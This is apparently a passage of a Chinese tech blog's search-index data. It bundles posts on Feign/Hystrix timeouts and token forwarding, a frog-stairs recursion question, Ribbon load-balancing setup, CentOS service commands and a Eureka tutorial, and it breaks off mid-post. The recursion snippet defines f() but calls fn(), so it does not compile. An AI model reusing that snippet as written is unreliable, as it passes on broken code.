Feign 和 Ribbon 整合了 Hystrix 之后，可能会出现首次调用失败的问题。原因是 Hystrix 默认的超时时间是 1 秒，如果超过这个时间尚未作出响应，将会进入 fallback 代码。由于 Bean 的装配以及懒加载机制等，Feign 首次请求都会比较慢，如果这个响应时间超过 1 秒，就会出现请求失败的问题。此时可以采取以下三种方法处理： 使用 Feign 的时候直接关闭 Hystrix（不推荐）： feign.hystrix.enabled=false 禁用 Hystrix 的超时时间： hystrix.command.default.execution.timeout.enabled=false 将 Hystrix 的超时时间改为 5 秒： hystrix.command.default.execution.isolation.thread.timeoutInMilliseconds=5000 Feign 调用传递 Token在进行认证鉴权的时候，不管是 JWT 还是 Spring Security，当使用 Feign 时就会发现外部请求到 A 服务的时候，A 服务是可以拿到 Token 的；然而当 A 服务使用 Feign 调用 B 服务时，Token 就会丢失，从而导致认证失败。解决方法比较简单，可以利用 RequestInterceptor 拦截器，在 Feign 调用的时候，向请求头里面添加需要传递的 Token，示例代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940/** * Feign统一Token拦截器 */@Componentpublic class FeignTokenInterceptor implements RequestInterceptor { @Override public void apply(RequestTemplate requestTemplate) { if(null==getHttpServletRequest()){ //此处省略日志记录 return; } //将获取Token对应的值往下面传 requestTemplate.header("oauthToken", getHeaders(getHttpServletRequest()).get("oauthToken")); } private HttpServletRequest getHttpServletRequest() { try { return ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest(); } catch (Exception e) { return null; } } /** * Feign拦截器拦截请求获取Token对应的值 * @param request * @return */ private Map&lt;String, String&gt; getHeaders(HttpServletRequest request) { Map&lt;String, String&gt; map = new LinkedHashMap&lt;&gt;(); Enumeration&lt;String&gt; enumeration = request.getHeaderNames(); while (enumeration.hasMoreElements()) { String key = enumeration.nextElement(); String value = request.getHeader(key); map.put(key, value); } return map; }} Feign 返回图片流在使用 Feign 的过程中，可以将图片流转换成字节数组来传递，但是因为 Controller 层不能直接返回 byte，因此需要将 Feign 的返回值修改为 feign.Response 12@RequestMapping(value = "/createImageCode")public Response createImageCode(@RequestParam("imageKey") String imageKey); venus-cloud-feign 的使用为了方便在 API 中使用 Feign 替代 RestTemplate 的手动调用，在写 Feign 接口的时候，想用 Spring MVC 注解只在 Feign 接口写一遍，然后实现类实现此接口即可。但是 Spring MVC 不支持实现接口里的方法参数上的注解（支持继承类、方法上的注解），而且在 GET 请求多参数传递的问题上，需要通过拦截器的方式解决。为了解决上述两个问题，Spring Cloud 中国社区对 Spring Cloud Feign 进行了增强，项目名为 venus-cloud-feign，目前只支持 Spring Cloud 的 Finchley 版本，更多使用方式可以参考官方文档，这里不再累述。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"数据结构 - 算法面试题之一",url:"/posts/a0733161.html",text:'算法递归递归的三大要素： 第一要素：明确递归函数想要干什么 第二要素：寻找递归的结束条件 第三要素：找出递归函数的等价关系式 递归的优缺点： 递归中很多计算都是重复的，由于其本质是把一个问题分解成两个或者多个小问题，多个小问题存在相互重叠的部分，则存在重复计算 调用栈可能会溢出，其实每一次函数调用会在内存栈中分配空间，而每个进程的栈的容量是有限的，当递归的层次太深时，就会超出栈的容量，从而导致栈溢出 递归由于是函数调用自身，而函数调用是有时间和空间的消耗的；每一次函数调用，都需要在内存栈中分配空间以保存参数、返回地址以及临时变量，而往栈中压入数据和弹出数据都需要时间，导致运行效率较低 递归与循环相比，循环的代码可读性不如递归，但运行效率更高 案例分析： 一只青蛙一次可以跳上 1 级台阶，也可以跳上 2 级，求该青蛙跳上一个 N 级的台阶总共有多少种跳法？ 每次跳的时候，小青蛙可以跳一个台阶，也可以跳两个台阶，也就是说，每次跳的时候，小青蛙有两种跳法 第一种跳法：第一次跳了一个台阶，那么还剩下 n-1 个台阶还没跳，剩下的 n-1 个台阶的跳法有 f (n-1) 种 第二种跳法：第一次跳了两个台阶，那么还剩下 n-2 个 台阶还没跳，剩下的 n-2 个台阶的跳法有 f (n-2) 种 所以，小青蛙的全部跳法就是这两种跳法之和，即 f (n) = f (n-1) + f (n-2) 123456789101112131415public class Example { public static void main(String[] args) { int count = f(3); System.out.println(count); } public static int f(int n) { if (n &lt;= 2) { return n; } return fn(n - 1) + fn(n - 2); }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"企业面试"},{title:"Ribbon 入门教程 - 基础篇",url:"/posts/76f2eddc.html",text:'Ribbon 介绍Ribbon 是什么Ribbon 是 Netflix 公司开发的一个负载均衡组件，诞生于 2013 年 1 月，一直是 Netflix 活跃度较高的项目，由 Pivotal 公司将其整合进 Spring Cloud 生态。Ribbon 是一个基于 HTTP 和 TCP 的客户端负载均衡工具，通过 Spring Cloud 的封装， 可以轻松地将面向服务的 REST 模板请求自动转换成客户端负载均衡的服务调用。 此外，Ribbon 拥有丰富的负载均衡策略、重试机制、支持多协议的异步与响应式模型、容错、缓存与批次处理等功能。Ribbon 虽然只是一个工具类框架，它不像服务注册中心、配置中心、API 网关那样需要独立部署，但是它几乎存在于每一个 Spring Cloud 构建的微服务和基础设施中。 因为微服务间的调用，API 网关的请求转发等内容实际上都是通过 Ribbon 来实现的，Feign、Zuul 已经集成了 Ribbon，更多介绍可参考：Ribbon 项目、Ribbon 官方英文文档、Spring Cloud Ribbon 官方中文文档 Ribbon 与负载均衡负载均衡（Load Balance），即利用特定方式将流量分摊到多个操作单元上的一种手段，它对系统吞吐量与系统处理能力有着质的提升，当今极少企业没有用到负载均衡器或是负载均衡策略。常见的负载均衡实现有 Nginx 与 LVS，且不管它们的使用方式，工作在什么层次，本质还是对流量的疏导。业界对于负载均衡有不少分类，最常见的有软负载与硬负载，代表产品是 Nginx 与 F5；还有一组分类最能体现出 Ribbon 与传统负载均衡的差别，那就是集中式负载均衡与进程内负载均衡。集中式负载均衡指位于因特网与服务提供者之间，并负责把网络请求转发到各个提供单位，这时候 Nginx 与 F5 就可以归为一类，也可以称是服务端负载均衡。进程内负载均衡是指从一个实例库选取一个实例进行流量导入，在微服务的范畴内，实例库一般存储在 Zookeeper、Eureka、Consul、etcd 这样的注册中心，而此时的负载均衡器就是类似 Ribbon 的 IPC（Inter-Process Communication，进程间通信）组件，因此进程内负载均衡也叫做客户端负载均衡。 Ribbon 入门案例1. 版本说明在下面的的教程中，使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，点击下载完整的案例代码 2. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 3. 创建 Eureka Server 工程创建 Eureka Server 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-netflix-eureka-server 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Eureka Server 的启动主类，这里添加相应注解，作为程序的入口： 12345678@SpringBootApplication@EnableEurekaServerpublic class EurekaServerApplication { public static void main(String[] args){ SpringApplication.run(EurekaServerApplication.class, args); }} 添加 Eureka Server 需要的 application.yml 配置文件到工程中 1234567891011server: port: 8090eureka: instance: hostname: 127.0.0.1 client: registerWithEureka: false fetchRegistry: false serviceUrl: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 4. 创建 Provider 源服务工程为了测试 Ribbon 的负载均衡功能，必须要有一个源服务（服务提供者），并且可以选择启动多个实例，在每个实例中需要有一个标识（例如端口）来识别每次的调用是到了不同的服务实例上。这里可以使用一份代码，采取改变端口号的方式启动多次，就能启动多个相同的服务实例。创建 Provider 的 Maven 工程后，由于需要将服务注册到 Eureka Server，工程下的 pom.xml 文件需要引入 spring-cloud-starter-netflix-eureka-client 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Provider 的启动主类，添加注解 @EnableDiscoveryClient，将服务注册到 Eureka Server： 12345678@SpringBootApplication@EnableDiscoveryClientpublic class ProviderApplication { public static void main(String[] args){ SpringApplication.run(ProviderApplication.class, args); }} 在 application.yml 文件中指定服务名称（provider）、注册中心地址与端口号，后面启动多实例只需要修改这里的端口号即可： 12345678910111213server: port: 9090spring: application: name: providereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true 创建用于测试的 Controller 类： 12345678@RestControllerpublic class ProviderController { @GetMapping("/provider/add") public String add(Integer a, Integer b, HttpServletRequest request) { return "From Port: " + request.getServerPort() + ", Result: " + (a + b); }} 5. 创建 Ribbon 客户端工程要使用 Ribbon，需要在 pom.xml 文件中引入依赖 spring-cloud-starter-netflix-ribbon，另外由于需要从 Eureka Server 获取服务列表，即作为 Eureka 客户端，还需要引入 spring-cloud-starter-netflix-eureka-client 12345678910&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-ribbon&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建启动主类，添加注解 @EnableDiscoveryClient 12345678@SpringBootApplication@EnableDiscoveryClientpublic class RibbonLoadBalanceApplication { public static void main(String[] args){ SpringApplication.run(RibbonLoadBalanceApplication.class, args); }} 创建统一配置类，声明 RestTemplate 的 Bean，并且添加注解 @LoadBalanced，指定该 RestTemplate 需要使用客户端负载均衡： 123456789@Configurationpublic class CommonConfiguration{ @Bean @LoadBalanced public RestTemplate restTemplate(){ return new RestTemplate(); }} 创建用于测试的 Controller 类，因为 Ribbon 客户端需要创建一个 API 来供第三方调用 Provider 源服务的那个自定义 API，这里需要用 RestTemplate 来调用： 123456789101112131415@RestControllerpublic class CalculateController { @Autowired private RestTemplate restTemplate; /** * 这里的"PROVIDER"是服务提供者的实例名称的英文大写 */ @GetMapping("/add") public String add(Integer a, Integer b) { String result = restTemplate.getForObject("http://PROVIDER/provider/add?a=" + a + "&amp;b=" + b, String.class); return result; }} 在 application.yml 文件中配置端口号、注册中心地址即可： 12345678910111213server: port: 8080spring: application: name: ribbon-loadbalanceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true 6. 测试 启动 Eureka Server 后，更改 Provider 源服务的端口号为 9091 与 9092 后分别启动，浏览器访问 http://127.0.0.1:8090，查看 Eureka Server 的界面是否正常显示多个 Provider 源服务 启动 Ribbon 客户端应用，浏览器访问 http://127.0.0.1:8080/add?a=10&amp;b=5，若正常返回计算结果，说明整个项目运行成功 提示：当存在多个服务提供者时，Ribbon 默认会使用轮询的方式访问源服务，此外 Ribbon 对服务实例节点的增减也能动态感知 Ribbon 负载均衡策略内置的七种负载均衡策略Ribbon 按照不同的需求，已经提供 7 种实现了 IRule 接口的实现类，包含了常用的负载均衡策略，默认的策略是轮询策略。内置的策略能够适用大部分负载均衡需求的应用场景，若有更复杂的需求，可以自己实现 IRule 接口。 策略类 命名 描述 实现说明 RandomRule 随机策略 随机选择可用的服务器 在 index 上随机，选择 index 对应位置的服务器 RoundRobinRule 轮询策略 按顺序循环选择服务器 轮询 index，选择 index 对应位置的服务器 RetryRule 重试策略 对选定的负载均衡策略机上重试机制 在一个配置时间段内当选择服务器不成功，则一直尝试使用 subRule 的方式选择一个可用的服务器 BestAvailableRule 最低并发策略 选择一个并发请求量最少的服务器 逐个考察服务器，如果服务器的断路器打开，则忽略，再选择其他并发连接数最低的服务器 AvailabilityFilteringRule 可用过滤策略 过滤掉一直连接失败并被标记为 circuit tipped 的服务器，过滤掉那些高并发连接的服务器（active connections 超过配置的阀值） 使用一个 AvailabilityPredicate 来包含过滤服务器的逻辑，其实就是检查 status 里记录的各个服务器的运行状态 WeightedResponseTimeRule 响应时间加权策略 根据服务器的响应时间分配权重。响应时间越长，权重越低，被选择到的概率越低；响应时间越短，权重越高，被选择到的概率就越高。这个策略很贴切，综合了各种因素，如：网络、磁盘、CPU 等，这些因素都直接影响着响应时间 一个后台线程定期的从 status 里面读取评价响应时间，为每个服务器计算一个权重；其中权重的计算也比较简单，responsetime 减去每个服务器自己平均的 responsetime 就是服务器的权重。当刚开始运行，没有形成 status 时，使用轮询策略选择服务器 ZoneAvoidanceRule 区域权衡策略 综合判断服务器所在区域的性能和服务器的可用性来轮询选择服务器，并且判断一个 Zone 的运行性能是否可用，剔除不可用的 Zone 中的所有服务器 使用 ZoneAvoidancePredicate 和 AvailabilityPredicate 来判断是否选择某个服务器，前一个判断判定一个 zone 的运行性能是否可用，剔除不可用的 zone 的所有服务器，AvailabilityPredicate 则用于过滤掉连接数过多的服务器 全局负载均衡策略的配置使用 Ribbon 的时候若想要全局更改负载均衡策略，此时只需要增加一个配置类，加上之后凡是通过 Ribbon 的请求都会按照配置的策略来进行负载均衡 12345678@Configurationpublic class RuleConfiguration { @Bean public IRule customRule(){ return new RandomRule(); }} 基于注解的自定义策略配置若想针对某一个源服务设置其特有的负载均衡策略，可以通过使用 @RibbonClient 注解来实现。 创建 @AvoidScan 注解类，只有一个空的声明 123public @interface AvoidScan {} 配置类里注入针对 Ribbon 客户端的配置管理器（非必须），添加 @AvoidScan 注解 123456789101112@AvoidScan@Configurationpublic class RuleConfiguration { @Autowired IClientConfig config; @Bean public IRule customRule(IClientConfig config){ return new RandomRule(); }} 启动主类加上 @RibbonClient 注解，配置内容表示对 provider 服务使用的策略是通过 RuleConfiguration 类所配置的。此外这里使用 @ComponentScan 注解的意思是让 Spring 不去扫描被 @AvoidScan 注解标记的配置类，因为这里的策略配置是希望对单个源服务生效的，所以不能应用于全局。若不想使用 @AvoidScan 注解，只要保证 RuleConfiguration 类 不被 @ComponentScan 注解扫描到就行，简单的做法可以将 RuleConfiguration 类不存放在启动主类（RibbonLoadBalanceApplication）所在的包及其子包下。特别注意：无论是在 Java 代码中还是 YML 配置文件中，只要引用到服务名称的地方，都需要使用大写英文字符的服务名称，否则会找不到对应的服务提供者，导致策略的配置不生效 12345678910@SpringBootApplication@EnableDiscoveryClient@RibbonClient(name = "PROVIDER", configuration = RuleConfiguration.class)@ComponentScan(excludeFilters = {@ComponentScan.Filter(type = FilterType.ANNOTATION, value = {AvoidScan.class})})public class RibbonLoadBalanceApplication { public static void main(String[] args){ SpringApplication.run(RibbonLoadBalanceApplication.class, args); }} 若想对多个源服务指定对应的负载均衡策略，可以使用 @RibbonClients 注解 123456@RibbonClients(value = { @RibbonClient(name = "PROVIDER-USER", configuration = UserRuleConfiguration.class), @RibbonClient(name = "PROVIDER-DEPT", configuration = DeptRuleConfiguration.class)})public class RibbonLoadBalanceApplication {} 基于配置文件的自定义策略配置可以使用配置文件来对源服务的负载均衡策略进行配置，其基本语法是 &lt;service name&gt;.ribbon.*，使用它几乎可以不用写注解形式的任何配置代码，下述配置是对 provider 服务使用随机策略 123PROVIDER: ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule 区域权衡策略的配置Ribbon 默认实现了区域权衡策略，因此可以通过 Eureka 实例的元数据配置来实现区域化的实例配置方案。Ribbon 会优先访问与客户端处于一个 Zone 中的服务端实例，只有当被选中的 Zone 中没有可用的服务端实例的时候才会访问其他 Zone 中的服务端实例。因此通过 zone 属性的定义，将处于不同机房的实例配置成不同的区域值，配合实际部署的物理结构，可以有效地设计出针对区域性故障的容错集群。而实现的方式非常简单，只需在 Eureka 的服务实例的元数据中增加 zone 参考来指定自己所在的区域，下述内容是配置在 Eureka 的服务实例中： 1234eureka: instance: metadata-map: zone: shanghai Ribbon 配置实战Ribbon 超时与重试使用 HTTP 发起请求，免不了遇到极端环境，此时对调用进行时限控制以及时限之后的重试尤为重要。在 Spring Cloud 的 Brixtion 版本中，对于重试机制的实现需要开发者自行扩展实现，而从 Camden SR2 版本开始，Spring Cloud 整合了 Spring Retry 来增加 RestTemplate 的重试能力，只需要通过简单的配置，原来那些通过 RestTemplate 实现的服务访问就会自动根据配置来实现重试机制。注意，Finchley 版中 Ribbon 的重试机制默认是开启的，只需要添加针对超时时间与重试策略的配置即可。下述配置是对 provider 服务配置超时与重试相关参数： 12345678PROVIDER: ribbon: ConnectTimeout: 3000 ReadTimeout: 60000 MaxAutoRetries: 1 #对第一次请求的服务的重试次数 MaxAutoRetriesNextServer: 1 #要重试的下一个服务的最大数量（不包括第一个服务） OkToRetryOnAllOperations: true NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule Ribbon 的饥饿加载Ribbon 在进行客户端负载均衡的时候，并不是启动时就加载上下文的，而是在实际请求的时候才去创建，因此这个特性往往会让第一次调用显得疲软乏力，严重的时候会引起调用超时。此时可用通过指定 Ribbon 具体的客户端的名称来开启饥饿加载，即在启动的时候便加载所有配置项的应用程序上下文。 1234ribbon: eager-load: enabled: true clients: PROVIDER-USER, PROVIDER-DEPT, PROVIDER-ORDER 基于配置文件自定义 Ribbon 客户端Ribbon 在 1.2.0 版本之后，支持使用配置文件来定制 Ribbon 客户端，其实质就是使用配置文件来指定一些默认加载类，从而更改 Ribbon 客户端的默认行为方式，并且这种方法的优先级是最高的，优先级高于使用注解 @RibbonClient 指定的配置和 Java 源码中加载的相关 Bean，具体配置规则如下： 下述配置，表示是对 provider 服务使用随机策略 123PROVIDER: ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule Ribbon 脱离 Eureka 的使用在默认情况下，Ribbon 客户端会从 Eureka 注册中心读取服务注册信息列表，来达到动态负载均衡的目的。若不想从 Eureka 注册中心读取服务注册列表，可以配置 Ribbon 客户端使用指定的源服务地址，让 Ribbon 脱离 Eureka 使用，配置实例如下： 1234567ribbon: eureka: enabled: false #禁用Eureka的功能PROVIDER: ribbon: listOfServers: http://127.0.0.1:7000, http://127.0.0.1:7001 #指定provider服务的服务地址 Ribbon 进阶核心接口 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务"},{title:"Linux 运维面试题之一",url:"/posts/fe7d7b9d.html",text:'LinuxCentos 6、7 的服务类相关命令 Centos 6 注册在系统中的标准化程序 统一的管理方式（常用方法） service 服务名 start service 服务名 stop service 服务名 restart service 服务名 status 查看服务的方法： /etc/init.d/服务名 通过 chkconfig 命令管理服务自启动 查看自启动的服务： chkconfig --list|grep xxx 启用服务自启动： chkconfig --level 5 服务名 on 关闭服务自启动： chkconfig --level 5 服务名 off Centos 7 注册在系统中的标准化程序 统一的管理方式（常用方法） systemctl start 服务名（xxx.service） systemctl stop 服务名（xxx.service） systemctl restart 服务名（xxx.service） systemctl reload 服务名（xxx.service） systemctl status 服务名（xxx.service） 查看服务的方法： /usr/lib/systemd/system/服务名 查看服务的命令 systemctl list-unit-files | grep service_name systemctl --type service | grep service_name 通过 systemctl 命令管理服务自启动 启用服务自启动： systemctl enable service_name 关闭服务自启动： systemctl disable service_name var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"企业面试"},{title:"Eureka 入门教程 - 基础篇",url:"/posts/be1e11c7.html",text:'Eureka 介绍Eureka 是什么Eureka 是 Netflix 开发的一款基于 HTTP REST 的服务，由 Pivotal 公司将其整合进 Spring Cloud 生态。Netflix 在设计 Eureka 时遵守的是 AP 原则，通常用于服务注册发现、负载均衡和故障转移等，也是 Spring Cloud 中使用的服务注册发现组件。Eureka 采用 C/S 架构，提供了一个基于 Java 的 Client 组件，用来与服务端交互，同时具有一套内置的负载均衡器，可以进行基本的轮询负载均衡。Eureka 从 2012 年 9 月在 Github 上发布 1.1.2 版本以来，至今已经发布了 231 次，最新版本为 2020 年 4 月份发布的 1.9.20 版本。期间有进行 2.x 版本的开发，不过由于各种原因内部已经冻结开发，目前还是以 1.x 版本为主。更多介绍可参考：Eureka 项目、Eureka 官方英文文档、Spring Cloud Eureka 官方中文文档 Eureka 服务治理体系 Eureka 服务的三个角色 服务注册中心：Eureka 提供的服务端，提供服务注册与发现的功能，一般被称作 Eureka-Server； 服务消费者：消费者应用从服务注册中心获取服务列表，从而使消费者可以知道去何处调用其所需要的服务； 服务提供者：提供服务的应用，可以是 Spring Boot 应用，也可以是其他技术平台且遵循 Eureka 通信机制的应用。它将自己提供的服务注册到 Eureka，以供其他应用发现。 Eureka 高可用性Eureka 的高可用性Eureka 的服务注册中心，它和其他服务注册中心一样，支持高可用配置。依托于强一致性提供良好的服务实例可用性，可以应对多种不同的故障场景。Eureka 服务端支持集群模式部署，当集群中有分片发生故障的时候（超过 85% 的服务实例丢失心跳），Eureka 会自动转入自我保护模式。它允许在分片发生故障的时候继续提供服务的发现和注册，当故障恢复时，集群中的其他分片会把各自的状态再次同步回来。集群中的的不同服务注册中心通过异步模式互相复制各自的状态，这也意味着在给定的时间点每个实例关于所有服务的状态可能存在不一致的现象。 Eureka 的自我保护模式默认情况下，如果 Eureka Server 在一定时间内（默认 90 秒）没有接收到某个微服务实例的心跳，Eureka Server 将会注销该实例。但是当网络分区故障发生时，微服务与 Eureka Server 之间无法正常通信，这就可能变得非常危险了。因为微服务本身是健康的，此时本不应该注销这个微服务。Eureka Server 通过 “自我保护模式” 来解决这个问题，当 Eureka Server 节点在短时间内丢失过多客户端时（超过 85% 的服务实例丢失心跳，可能发生了网络分区故障），那么这个节点就会进入自我保护模式。一旦进入该模式，Eureka Server 就会保护服务注册表中的信息，不再删除服务注册表中的数据（也就是不会注销任何微服务）。当网络故障恢复后，该 Eureka Server 节点会自动退出自我保护模式。自我保护模式是一种对网络异常的安全保护措施，使用自我保护模式，可以让 Eureka 集群更加的健壮、稳定。 在自我保护模式中，Eureka Server 会保护注册表中的信息，不再注销任何服务实例。当它收到的心跳数重新恢复到阀值以上时，该 Eureka Server 节点就会自动退出自我保护模式。它的设计哲学就是宁可保留错误的服务注册信息（健康或不健康的微服务都会保留），也不盲目注销任何可能健康的服务实例。在 Spring Cloud 中，可以使用 eureka.server.enable-self-preservation: false 来禁用自我保护模式。 Eureka 自我保护模式的效果 Eureka 不再从注册列表移除因长时间没收到心跳而应该过期的服务 Eureka 仍然能够接受新服务的注册和查询请求，但是不会被同步到其他节点（高可用） Eureka 在网络稳定的时候，当前实例新的注册信息会被同步到其他节点中（最终一致性） Eureka 可以很好的应对因网络故障导致部分节点失去联系的情况，而不会像 ZooKeeper 一样使得整个注册中心瘫痪 Eureka 的健康检查在 Eureka 中，微服务状态可取值为 DOWN、OUT_OF_SERVICE、UNKNOWN 等，只有 UP 的微服务会被请求。由于 Eureka Server 与 Eureka Client 之间使用心跳机制来确定 Eureka Client 的状态，默认情况下服务器端与客户端的心跳保持正常，应用程序就会始终保持 UP 状态，所以微服务的 UP 并不能完全反应应用程序的状态。Spring Boot Actuator 提供了 /health 端点，该端点可展示应用程序的健康信息，只要将该端点中的健康状态传播到 Eureka Server 就可以了，实现这点很简单，只需为微服务配置如下内容即可。如果需要更细粒度健康检查，可实现 com.netflix.appinfo.HealthCheckHandler 接口，EurekaHealthCheckHandler 已实现了该接口。 12# 开启健康检查（需要添加spring-boot-starter-actuator依赖）eureka.client.healthcheck.enabled = true Eureka 入门案例1. 版本说明以下案例使用了版本较旧的 SpringCloud-Dalston.SR1 + SpringBoot-1.5.9.RELEASE，配置方式跟最新版本的 SpringCloud 有一定的区别 2. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下： 123456789101112131415161718192021222324&lt;properties&gt; &lt;springcloud.version&gt;Dalston.SR1&lt;/springcloud.version&gt; &lt;springboot.version&gt;1.5.9.RELEASE&lt;/springboot.version&gt;&lt;/properties&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt; &lt;version&gt;${springboot.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;${springcloud.version}&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt; 3. 创建 Eureka Server 工程创建 Eureka Server 的 Maven 工程，配置工程里的 pom.xml 文件，只需添加 spring-cloud-starter-eureka-server 即可；若使用最新版本的 SpringCloud，则需要改为添加 spring-cloud-starter-netflix-eureka-server 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Eureka Server 的启动主类，这里添加相应注解，作为程序的入口： 12345678@SpringBootApplication@EnableEurekaServerpublic class EurekaServerApplication { public static void main(String[] args){ SpringApplication.run(EurekaServerApplication.class, args); }} 添加 Eureka Server 需要的 application.yml 配置文件到工程的 src/main/resources 目录下： 1234567891011server: port: 7001eureka: instance: hostname: localhost #Eureka服务端的实例名称 client: register-with-eureka: false #false表示不向注册中心注册自己 fetch-registry: false #false表示自己就是注册中心，职责就是维护服务实例，并不需要去检索服务 service-url: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 4. 创建 Eureka Client 工程创建 Eureka Client 的 Maven 工程（作为服务提供者），配置工程里的 pom.xml 文件，需要添加以下内容。若使用最新版的 SpringCloud，此时只需要引入 spring-cloud-starter-netflix-eureka-client 依赖 12345678910&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-eureka&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt; 